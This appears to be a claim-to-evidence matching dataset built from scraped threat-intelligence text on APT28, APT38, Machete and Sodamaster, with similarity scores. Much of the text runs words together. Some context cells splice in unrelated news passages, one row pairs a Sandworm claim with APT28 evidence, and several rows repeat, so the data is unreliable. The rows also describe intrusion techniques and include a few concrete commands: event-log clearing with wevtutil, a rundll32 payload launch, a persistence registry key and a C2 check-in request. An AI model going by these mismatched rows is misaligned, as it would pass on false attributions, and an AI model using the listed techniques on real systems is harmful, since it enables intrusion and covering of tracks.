"apt28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate owa page.",[33][3][21]enterpriset1559.002inter-process communication:dynamic data exchangeapt28has deliveredjhuhugitandkoadicby executing powershell commands through dde in word documents. [41][42][11]enterpriset1036masqueradingapt28has renamed the winrar utility to avoid detection.,"[2].005match legitimate name or locationapt28has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate owa page.","[2]enterpriset1498network denial of servicein 2016,apt28conducted a distributed denial of service (ddos) attack against the world anti-doping agency. [14]enterpriset1040network sniffingapt28deployed the open source tool responder to conduct netbios name service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.",66f57ea33063d29485700d48,2999,0.8429134876702716
apt28 has used the ntdsutil.exe utility to export the active directory database for credential access.,[44][3][14].001lsass memoryapt28regularly deploys both publicly available (ex:mimikatz) and custom password retrieval tools on victims. [44][3]they have also dumped the lsass process memory using the minidump function.,[2].003ntdsapt28has used the ntdsutil.exe utility to export the active directory database for credential access.,[2]enterpriset1120peripheral device discoveryapt28uses a module to receive a notification every time a usb mass storage device is inserted into a victim. [33]enterpriset1566.001phishing:spearphishing attachmentapt28sent spearphishing emails containing malicious microsoft office and rar attachments.,66f57ea33063d29485700d48,3009,0.8284810996540338
"apt28 deployed the open source tool responder to conduct netbios name service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.","[2].005match legitimate name or locationapt28has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate owa page. [2]enterpriset1498network denial of servicein 2016,apt28conducted a distributed denial of service (ddos) attack against the world anti-doping agency.","[14]enterpriset1040network sniffingapt28deployed the open source tool responder to conduct netbios name service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.","[6][39]apt28close-access teams have used wi-fi pineapples to intercept wi-fi signals and user credentials. [14]enterpriset1027.013obfuscated files or information:encrypted/encoded fileapt28encrypted a .dll payload using rtl and a custom encryption algorithm.apt28has also obfuscated payloads with base64, xor, and rc4.",66f57ea33063d29485700d48,3001,0.8153320247105587
apt28 close-access teams have used wi-fi pineapples to intercept wi-fi signals and user credentials.,"[2]enterpriset1498network denial of servicein 2016,apt28conducted a distributed denial of service (ddos) attack against the world anti-doping agency. [14]enterpriset1040network sniffingapt28deployed the open source tool responder to conduct netbios name service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.",[6][39]apt28close-access teams have used wi-fi pineapples to intercept wi-fi signals and user credentials.,"[14]enterpriset1027.013obfuscated files or information:encrypted/encoded fileapt28encrypted a .dll payload using rtl and a custom encryption algorithm.apt28has also obfuscated payloads with base64, xor, and rc4. [38][36][11][18][17]enterpriset1588.002obtain capabilities:toolapt28has obtained and used open-source tools likekoadic,mimikatz, andresponder.",66f57ea33063d29485700d48,3002,0.8843441671460297
machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57efb3063d29485700d70,3989,0.7133947431675975
machete employed some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57efb3063d29485700d70,3989,0.786635957066339
apt28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.,[21]enterpriset1037.001boot or logon initialization scripts:logon script (windows)anapt28loader trojan adds the registry keyhkcu\\\\environment\\\\userinitmprlogonscriptto establish persistence. [30]enterpriset1110brute forceapt28can perform brute force attacks to obtain credentials.,[29][21][31].001password guessingapt28has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.,"[24]apt28has also used a kubernetes cluster to conduct distributed, large-scale password guessing attacks. [2].003password sprayingapt28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.",66f57ea33063d29485700d48,2953,0.8898344230203116
apt28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.,"[29][21][31].001password guessingapt28has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. [24]apt28has also used a kubernetes cluster to conduct distributed, large-scale password guessing attacks.",[2].003password sprayingapt28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.,"[24][31]apt28has also used a kubernetes cluster to conduct distributed, large-scale password spray attacks. [2]enterpriset1059.001command and scripting interpreter:powershellapt28downloads and executes powershell scripts and performs powershell commands.",66f57ea33063d29485700d48,2955,0.7359929536355205
"apt28 has also used a kubernetes cluster to conduct distributed, large-scale password guessing attacks.",[30]enterpriset1110brute forceapt28can perform brute force attacks to obtain credentials. [29][21][31].001password guessingapt28has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.,"[24]apt28has also used a kubernetes cluster to conduct distributed, large-scale password guessing attacks.","[2].003password sprayingapt28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks. [24][31]apt28has also used a kubernetes cluster to conduct distributed, large-scale password spray attacks.",66f57ea33063d29485700d48,2954,0.832957872696539
apt28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.,[21]enterpriset1037.001boot or logon initialization scripts:logon script (windows)anapt28loader trojan adds the registry keyhkcu\\\\environment\\\\userinitmprlogonscriptto establish persistence. [30]enterpriset1110brute forceapt28can perform brute force attacks to obtain credentials.,[29][21][31].001password guessingapt28has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.,"[24]apt28has also used a kubernetes cluster to conduct distributed, large-scale password guessing attacks. [2].003password sprayingapt28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.",66f57ea33063d29485700d48,2953,0.7080400623614842
apt28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.,"[29][21][31].001password guessingapt28has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. [24]apt28has also used a kubernetes cluster to conduct distributed, large-scale password guessing attacks.",[2].003password sprayingapt28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.,"[24][31]apt28has also used a kubernetes cluster to conduct distributed, large-scale password spray attacks. [2]enterpriset1059.001command and scripting interpreter:powershellapt28downloads and executes powershell scripts and performs powershell commands.",66f57ea33063d29485700d48,2955,0.9226664632404997
"apt28 has also used a kubernetes cluster to conduct distributed, large-scale password spray attacks.","[24]apt28has also used a kubernetes cluster to conduct distributed, large-scale password guessing attacks. [2].003password sprayingapt28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.","[24][31]apt28has also used a kubernetes cluster to conduct distributed, large-scale password spray attacks.",[2]enterpriset1059.001command and scripting interpreter:powershellapt28downloads and executes powershell scripts and performs powershell commands. [11][21][2].003command and scripting interpreter:windows command shellanapt28loader trojan uses a cmd.exe and batch script to run its payload.,66f57ea33063d29485700d48,2956,0.7932554745056912
apt28 uses a module to receive a notification every time a usb mass storage device is inserted into a victim.,[44][3]they have also dumped the lsass process memory using the minidump function. [2].003ntdsapt28has used the ntdsutil.exe utility to export the active directory database for credential access.,[2]enterpriset1120peripheral device discoveryapt28uses a module to receive a notification every time a usb mass storage device is inserted into a victim.,[33]enterpriset1566.001phishing:spearphishing attachmentapt28sent spearphishing emails containing malicious microsoft office and rar attachments. [36][10][11][3][22][17][21][16].002phishing:spearphishing linkapt28sent spearphishing emails which used a url-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.,66f57ea33063d29485700d48,3010,0.7925687256457314
an apt28 loader trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.,[28]enterpriset1542.003pre-os boot:bootkitapt28has deployed a bootkit along withdowndelphto ensure its persistence on the victim. the bootkit shares code with some variants ofblackenergy.,[20]enterpriset1057process discoveryanapt28loader trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.,"[30]enterpriset1090.002proxy:external proxyapt28used other victims as proxies to relay command traffic, for instance using a compromised georgian military email server as a hop point to nato victims. the group has also used a tool that acts as a proxy to allow c2 even if the victim is behind a router.apt28has also used a machine to relay and obscure communications betweenchopstickand their server.",66f57ea33063d29485700d48,3017,0.7594344888243688
apt28 uses a tool to infect connected usb devices and transmit itself to air-gapped computers when the infected usb device is inserted.,[6][38][3].003proxy:multi-hop proxyapt28has routed traffic overtorand vpn servers to obfuscate their activities. [21]enterpriset1021.002remote services:smb/windows admin sharesapt28has mapped network drives usingnetand administrator credentials.,[2]enterpriset1091replication through removable mediaapt28uses a tool to infect connected usb devices and transmit itself to air-gapped computers when the infected usb device is inserted.,[33]enterpriset1014rootkitapt28has used a uefi (unified extensible firmware interface) rootkit known aslojax. [12][45]enterpriset1113screen captureapt28has used tools to take screenshots from victims.,66f57ea33063d29485700d48,3022,0.8336588637297664
an apt28 loader trojan saved a batch script that uses rundll32 to execute a dll payload.,"they also targeted yahoo users with applications masquerading as ""delivery service"" and ""mcafee email protection"". [47]enterpriset1218.011system binary proxy execution:rundll32apt28executedchopstickby using rundll32 commands such asrundll32.exe ""c:\\\\windows\\\\twain_64.dll"".apt28also executed a .dll for a first stage dropper using rundll32.exe.",anapt28loader trojan saved a batch script that uses rundll32 to execute a dll payload.,"[5][38][11][30][13][2]enterpriset1221template injectionapt28used weaponized microsoft word documents abusing the remote template function to retrieve a malicious macro. [48]enterpriset1199trusted relationshiponceapt28gained access to the dccc network, the group then proceeded to use that access to compromise the dnc network.",66f57ea33063d29485700d48,3029,0.7570228903265436
"apt38 has used rundll32.exe to execute binaries, scripts, and control panel item files and to execute code via proxy to avoid triggering security tools.","[1]enterpriset1518.001software discovery:security software discoveryapt38has identified security software, configurations, defensive tools, and sensors installed on a compromised system. [1]enterpriset1218.001system binary proxy execution:compiled html fileapt38has used chm files to move concealed payloads.","[10].011system binary proxy execution:rundll32apt38has used rundll32.exe to execute binaries, scripts, and control panel item files and to execute code via proxy to avoid triggering security tools.","[1]enterpriset1082system information discoveryapt38has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs. [1]enterpriset1049system network connections discoveryapt38installed a port monitoring tool, mapmaker, to print the active tcp connections on the local system.",66f57e233063d29485700d12,1394,0.7879745440419353
apt38 has used dyepack.fox to manipulate pdf data as it is accessed to remove traces of fraudulent swift transactions from the data displayed to the end user.,"[1]enterpriset1565.001data manipulation:stored data manipulationapt38has used dyepack to create, delete, and alter records in databases used for swift transactions. [2].002data manipulation:transmitted data manipulationapt38has used dyepack to manipulate swift messages en route to a printer.",[2].003data manipulation:runtime data manipulationapt38has used dyepack.fox to manipulate pdf data as it is accessed to remove traces of fraudulent swift transactions from the data displayed to the end user.,[2]enterpriset1561.002disk wipe:disk structure wipeapt38has used a custom mbr wiper named bootwreck to render systems inoperable. [2]enterpriset1189drive-by compromiseapt38has conducted watering holes schemes to gain initial access to victims.,66f57e233063d29485700d12,1370,0.8317778953006573
apt38 has used task scheduler to run programs at system startup or on a scheduled basis for persistence.,"[1]enterpriset1057process discoveryapt38leveraged sysmon to understand the processes, services in the organization. [2]enterpriset1053.003scheduled task/job:cronapt38has used cron to create pre-scheduled and periodic background jobs on a linux system.",[1].005scheduled task/job:scheduled taskapt38has used task scheduler to run programs at system startup or on a scheduled basis for persistence.,"[1]enterpriset1505.003server software component:web shellapt38has used web shells for persistence or to ensure redundant access. [1]enterpriset1518.001software discovery:security software discoveryapt38has identified security software, configurations, defensive tools, and sensors installed on a compromised system.",66f57e233063d29485700d12,1390,0.7390085064292571
"apt38 has used several code packing methods such as themida, enigma, vmprotect, and obsidium, to pack their implants.",[2]enterpriset1106native apiapt38has used the windows api to execute code within a victim's system. [1]enterpriset1135network share discoveryapt38has enumerated network shares on a compromised host.,"[1]enterpriset1027.002obfuscated files or information:software packingapt38has used several code packing methods such as themida, enigma, vmprotect, and obsidium, to pack their implants.",[2]enterpriset1588.002obtain capabilities:toolapt38has obtained and used open-source tools such asmimikatz. [9]enterpriset1566.001phishing:spearphishing attachmentapt38has conducted spearphishing campaigns using malicious email attachments.,66f57e233063d29485700d12,1385,0.7720573588668231
"apt28 has used several malicious applications to steal user oauth access tokens including applications masquerading as ""google defender"" ""google email protection,"" and ""google scanner"" for gmail users.",[12][45]enterpriset1113screen captureapt28has used tools to take screenshots from victims. [44][46][3][16]enterpriset1505.003server software component:web shellapt28has used a modified and obfuscated version of the regeorg web shell to maintain persistence on a target's outlook web access (owa) server.,"[2]enterpriset1528steal application access tokenapt28has used several malicious applications to steal user oauth access tokens including applications masquerading as ""google defender"" ""google email protection,"" and ""google scanner"" for gmail users.","they also targeted yahoo users with applications masquerading as ""delivery service"" and ""mcafee email protection"". [47]enterpriset1218.011system binary proxy execution:rundll32apt28executedchopstickby using rundll32 commands such asrundll32.exe ""c:\\\\windows\\\\twain_64.dll"".apt28also executed a .dll for a first stage dropper using rundll32.exe.",66f57ea33063d29485700d48,3026,0.8826077255732687
"they also targeted yahoo users with applications masquerading as ""delivery service"" and ""mcafee email protection"".","[44][46][3][16]enterpriset1505.003server software component:web shellapt28has used a modified and obfuscated version of the regeorg web shell to maintain persistence on a target's outlook web access (owa) server. [2]enterpriset1528steal application access tokenapt28has used several malicious applications to steal user oauth access tokens including applications masquerading as ""google defender"" ""google email protection,"" and ""google scanner"" for gmail users.","they also targeted yahoo users with applications masquerading as ""delivery service"" and ""mcafee email protection"".","[47]enterpriset1218.011system binary proxy execution:rundll32apt28executedchopstickby using rundll32 commands such asrundll32.exe ""c:\\\\windows\\\\twain_64.dll"".apt28also executed a .dll for a first stage dropper using rundll32.exe. anapt28loader trojan saved a batch script that uses rundll32 to execute a dll payload.",66f57ea33063d29485700d48,3027,1.0
"apt38 has used dyepack to create, delete, and alter records in databases used for swift transactions.",[2]enterpriset1486data encrypted for impactapt38has used hermes ransomware to encrypt files with aes256. [2]enterpriset1005data from local systemapt38has collected data from a compromised host.,"[1]enterpriset1565.001data manipulation:stored data manipulationapt38has used dyepack to create, delete, and alter records in databases used for swift transactions.",[2].002data manipulation:transmitted data manipulationapt38has used dyepack to manipulate swift messages en route to a printer. [2].003data manipulation:runtime data manipulationapt38has used dyepack.fox to manipulate pdf data as it is accessed to remove traces of fraudulent swift transactions from the data displayed to the end user.,66f57e233063d29485700d12,1368,0.7067469598555884
sodamaster can check for the presence of the registry key hkey_classes_root\\\\applications\\\\vmwarehostopen.exe before proceeding to its main functionality.,"a description of each command is shown in the following table.commanddescriptioncompilation time of sodamaster2019-01-072019-06-10dcreate thread for launching downloaded dll and call export function of the dll.enabledenabledfset value as rc4 key for the encrypted c2 communicationnot implementedenabledlset value as sleep timenot implementedenabledscreate thread for executing downloaded shellcodeenabledenabledbased on the analysis of the backdoor features of the sodamaster module, the purpose of this malware is also to download and execute payloads (dll or shellcode), like p8rat. unfortunately, we have not been able to obtain these payloads yet.the sodamaster module also shows an anti-vm feature.",the malware looks for the presence of the registry key “hkey_classes_root\\\\\\\\applications\\\\\\\\vmwarehostopen.exe” on the victim’s system before proceeding to its main functionality.,this registry key is specific to the vmware environment.sodamaster anti-vm checkanother characteristic of sodamaster is the use of a common obfuscation technique known as “stackstrings” to create the registry key in double-byte characters. we observed the same obfuscation technique used for a process name and dll name in other sodamaster samples.fyanti loader for quasarratthe last observed type of payload deployed by ecipekac is a loader module named fyanti loader.,66f57f323063d29485700d83,4599,0.8383427281050522
"apt38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.","[1]enterpriset1218.001system binary proxy execution:compiled html fileapt38has used chm files to move concealed payloads. [10].011system binary proxy execution:rundll32apt38has used rundll32.exe to execute binaries, scripts, and control panel item files and to execute code via proxy to avoid triggering security tools.","[1]enterpriset1082system information discoveryapt38has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.","[1]enterpriset1049system network connections discoveryapt38installed a port monitoring tool, mapmaker, to print the active tcp connections on the local system. [2]enterpriset1033system owner/user discoveryapt38has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.",66f57e233063d29485700d12,1395,0.8166869225082558
"apt38 installed a port monitoring tool, mapmaker, to print the active tcp connections on the local system.","[10].011system binary proxy execution:rundll32apt38has used rundll32.exe to execute binaries, scripts, and control panel item files and to execute code via proxy to avoid triggering security tools. [1]enterpriset1082system information discoveryapt38has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.","[1]enterpriset1049system network connections discoveryapt38installed a port monitoring tool, mapmaker, to print the active tcp connections on the local system.","[2]enterpriset1033system owner/user discoveryapt38has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users. [1]enterpriset1569.002system services:service executionapt38has created new services or modified existing ones to run executables, commands, or scripts.",66f57e233063d29485700d12,1396,0.7419274454425521
"apt38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.","[1]enterpriset1082system information discoveryapt38has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs. [1]enterpriset1049system network connections discoveryapt38installed a port monitoring tool, mapmaker, to print the active tcp connections on the local system.","[2]enterpriset1033system owner/user discoveryapt38has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.","[1]enterpriset1569.002system services:service executionapt38has created new services or modified existing ones to run executables, commands, or scripts. [1]enterpriset1529system shutdown/rebootapt38has used a custom mbr wiper named bootwreck, which will initiate a system reboot after wiping the victim's mbr.",66f57e233063d29485700d12,1397,0.8332415348272728
"apt38 has used a custom mbr wiper named bootwreck, which will initiate a system reboot after wiping the victim's mbr.","[2]enterpriset1033system owner/user discoveryapt38has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users. [1]enterpriset1569.002system services:service executionapt38has created new services or modified existing ones to run executables, commands, or scripts.","[1]enterpriset1529system shutdown/rebootapt38has used a custom mbr wiper named bootwreck, which will initiate a system reboot after wiping the victim's mbr.",[2]enterpriset1204.002user execution:malicious fileapt38has attempted to lure victims into enabling malicious macros within email attachments. [1],66f57e233063d29485700d12,1399,0.8223632294177141
apt28 has used cve-2015-1701 to access the system token and copy it into the current process as part of privilege escalation.,"""the company has not and will not respond to the extortion attempts. ""neither the company nor the federal agencies have offered more information about what was involved in the extortion attempt, or if that's how the company found out about the breach.who is investigating the matter?austal referred the incident to the australian federal police (afp) and the australian cyber security centre (acsc), which is run by the australian signals directorate (asd).the office of the australian information commissioner will also be involved in the investigation, given staff emails and phone numbers were accessed.amid the afp and acsc investigation, the agencies have provided advice and assistance to austal about how it can bolster its it systems and cyber security.the department of defence has also been involved in the investigation, determining if classified information was compromised.why are people concerned?from the prime minister to the departmental press releases, all have been keen to point out how the incident reinforces the serious nature of cyber threats.australia's spy chief duncan lewis, who runs asio, has repeatedly talked about the unprecedented levels of espionage and foreign interference.asd has also taken a more prominent role in recent weeks, a signal of the growing threat of cyber attacks to commercial operations and not just government agencies.that is in part because commercial agencies are playing a bigger role in building public infrastructure.",enterpriset1134.001access token manipulation:token impersonation/theftapt28has used cve-2015-1701 to access the system token and copy it into the current process as part of privilege escalation.,"[27]enterpriset1098.002account manipulation:additional email delegate permissionsapt28has used a powershell cmdlet to grant theapplicationimpersonationrole to a compromised account. [2]enterpriset1583.001acquire infrastructure:domainsapt28registered domains imitating nato, osce security websites, caucasus information resources, and other organizations.",66f57ea33063d29485700d48,2939,0.7072730207862706
apt38 has used dyepack to manipulate swift messages en route to a printer.,"[2]enterpriset1005data from local systemapt38has collected data from a compromised host. [1]enterpriset1565.001data manipulation:stored data manipulationapt38has used dyepack to create, delete, and alter records in databases used for swift transactions.",[2].002data manipulation:transmitted data manipulationapt38has used dyepack to manipulate swift messages en route to a printer.,[2].003data manipulation:runtime data manipulationapt38has used dyepack.fox to manipulate pdf data as it is accessed to remove traces of fraudulent swift transactions from the data displayed to the end user. [2]enterpriset1561.002disk wipe:disk structure wipeapt38has used a custom mbr wiper named bootwreck to render systems inoperable.,66f57e233063d29485700d12,1369,0.7316507692380511
"once apt28 gained access to the dccc network, the group then proceeded to use that access to compromise the dnc network.",anapt28loader trojan saved a batch script that uses rundll32 to execute a dll payload. [5][38][11][30][13][2]enterpriset1221template injectionapt28used weaponized microsoft word documents abusing the remote template function to retrieve a malicious macro.,"[48]enterpriset1199trusted relationshiponceapt28gained access to the dccc network, the group then proceeded to use that access to compromise the dnc network.","[3]enterpriset1550.001use alternate authentication material:application access tokenapt28has used several malicious applications that abused oauth access tokens to gain access to target email accounts, including gmail and yahoo mail. [47].002use alternate authentication material:pass the hashapt28has used pass the hash for lateral movement.",66f57ea33063d29485700d48,3031,0.7227855310834296
the group has specifically used credentials stolen through a spearphishing email to login to the dccc network.,"[14][16].002user execution:malicious fileapt28attempted to get users to click on microsoft office attachments containing malicious macro scripts. [36][17][16]enterpriset1078valid accountsapt28has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network.",the group has specifically used credentials stolen through a spearphishing email to login to the dccc network.,"the group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via iot devices such as a voip phone, printer, and video decoder. [49][3][23][2].004cloud accountsapt28has used compromised office 365 service accounts with global administrator privileges to collect email from user inboxes.",66f57ea33063d29485700d48,3037,1.0
"the group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via iot devices such as a voip phone, printer, and video decoder.","[36][17][16]enterpriset1078valid accountsapt28has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. the group has specifically used credentials stolen through a spearphishing email to login to the dccc network.","the group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via iot devices such as a voip phone, printer, and video decoder.",[49][3][23][2].004cloud accountsapt28has used compromised office 365 service accounts with global administrator privileges to collect email from user inboxes. [2]enterpriset1102.002web service:bidirectional communicationapt28has used google drive for c2.,66f57ea33063d29485700d48,3038,1.0000000000000002
"apt38 has used a command-line tunneler, nachocheese, to give them shell access to a victim’s machine.",[1]enterpriset1115clipboard dataapt38used a trojan called keylime to collect data from the clipboard. [2]enterpriset1059.001command and scripting interpreter:powershellapt38has used powershell to execute commands and other operational tasks.,"[1].003command and scripting interpreter:windows command shellapt38has used a command-line tunneler, nachocheese, to give them shell access to a victim’s machine.",[2].005command and scripting interpreter:visual basicapt38has used vbscript to execute commands and other operational tasks. [1]enterpriset1543.003create or modify system process:windows serviceapt38has installed a new windows service to establish persistence.,66f57e233063d29485700d12,1362,0.7123783344866541
the group has also used macros to execute payloads.,[2]enterpriset1059.001command and scripting interpreter:powershellapt28downloads and executes powershell scripts and performs powershell commands. [11][21][2].003command and scripting interpreter:windows command shellanapt28loader trojan uses a cmd.exe and batch script to run its payload.,[30]the group has also used macros to execute payloads.,[18][32][17][21]enterpriset1092communication through removable mediaapt28uses a tool that captures information from air-gapped computers via an infected usb and transfers it to network-connected computer when the usb is inserted. [33]enterpriset1586.002compromise accounts:email accountsapt28has used compromised email accounts to send credential phishing emails.,66f57ea33063d29485700d48,2959,0.8512893379733334
"apt38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.","gfw implemented a mitm attack on icloud using a self-signed certificate.the authorities only attacked ip 23.59.94.46. not all users in china are affected because the icloud dns might return different ip addresses.wirecapture with mitm:https://www.cloudshark.org/captures/03a6b0593436self-signed certificate used in the attack:http://www.mediafire.com/download/ampbnqncc277krv/fakeicloudcert.zipconnection log:http://pastebin.com/tn7kbdv3traceroute:http://pastebin.com/8y6zwfzghotmail mitmwirecap:https://www.cloudshark.org/captures/6011389a8ea3tcp traceroute:https://twitter.com/siyanmao/status/518963824481681408 enterpriset1071.001application layer protocol:web protocolsapt38used a backdoor, quickride, to communicate to the c2 server over http and https.","[2]enterpriset1217browser information discoveryapt38has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.",[1]enterpriset1110brute forceapt38has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable. [1]enterpriset1115clipboard dataapt38used a trojan called keylime to collect data from the clipboard.,66f57e233063d29485700d12,1358,0.8727908427408579
"apt28 has intentionally deleted computer files to cover their tracks, including with use of the program ccleaner.","[18][18].003hide artifacts:hidden windowapt28has used the windowstyle parameter to concealpowershellwindows. [11][41]enterpriset1070.001indicator removal:clear windows event logsapt28has cleared event logs, including by using the commandswevtutil cl systemandwevtutil cl security.","[5][3].004indicator removal:file deletionapt28has intentionally deleted computer files to cover their tracks, including with use of the program ccleaner.","[3].006indicator removal:timestompapt28has performed timestomping on victim files. [5]enterpriset1105ingress tool transferapt28has downloaded additional files, including by using a first-stage downloader to contact the c2 server to obtain the second-stage implant.",66f57ea33063d29485700d48,2993,0.7576379308088649
the group also searched a compromised dccc computer for specific terms.,"[6][39][40]enterpriset1133external remote servicesapt28has usedtorand a variety of commercial vpn services to route brute force authentication attempts. [2]enterpriset1083file and directory discoveryapt28has usedforfilesto locate pdf, excel, and word documents during collection.",the group also searched a compromised dccc computer for specific terms.,[35][3]enterpriset1589.001gather victim identity information:credentialsapt28has harvested user's login credentials. [31]enterpriset1564.001hide artifacts:hidden files and directoriesapt28has saved files with hidden file attributes.,66f57ea33063d29485700d48,2988,1.0
they have also dumped the lsass process memory using the minidump function.,[43]enterpriset1003os credential dumpingapt28regularly deploys both publicly available (ex:mimikatz) and custom password retrieval tools on victims. [44][3][14].001lsass memoryapt28regularly deploys both publicly available (ex:mimikatz) and custom password retrieval tools on victims.,[44][3]they have also dumped the lsass process memory using the minidump function.,[2].003ntdsapt28has used the ntdsutil.exe utility to export the active directory database for credential access. [2]enterpriset1120peripheral device discoveryapt28uses a module to receive a notification every time a usb mass storage device is inserted into a victim.,66f57ea33063d29485700d48,3008,0.9131963830589038
sandworm team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[3]enterpriset1550.001use alternate authentication material:application access tokenapt28has used several malicious applications that abused oauth access tokens to gain access to target email accounts, including gmail and yahoo mail. [47].002use alternate authentication material:pass the hashapt28has used pass the hash for lateral movement.",[33]enterpriset1204.001user execution:malicious linkapt28has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[14][16].002user execution:malicious fileapt28attempted to get users to click on microsoft office attachments containing malicious macro scripts. [36][17][16]enterpriset1078valid accountsapt28has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network.",66f57ea33063d29485700d48,3034,0.7720169915012491
apt28 has used the ntdsutil.exe utility to export the active directory database for credential access.,[44][3][14].001lsass memoryapt28regularly deploys both publicly available (ex:mimikatz) and custom password retrieval tools on victims. [44][3]they have also dumped the lsass process memory using the minidump function.,[2].003ntdsapt28has used the ntdsutil.exe utility to export the active directory database for credential access.,[2]enterpriset1120peripheral device discoveryapt28uses a module to receive a notification every time a usb mass storage device is inserted into a victim. [33]enterpriset1566.001phishing:spearphishing attachmentapt28sent spearphishing emails containing malicious microsoft office and rar attachments.,66f57ea33063d29485700d48,3009,0.8284810996540338
machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57efb3063d29485700d70,3989,0.7133947431675975
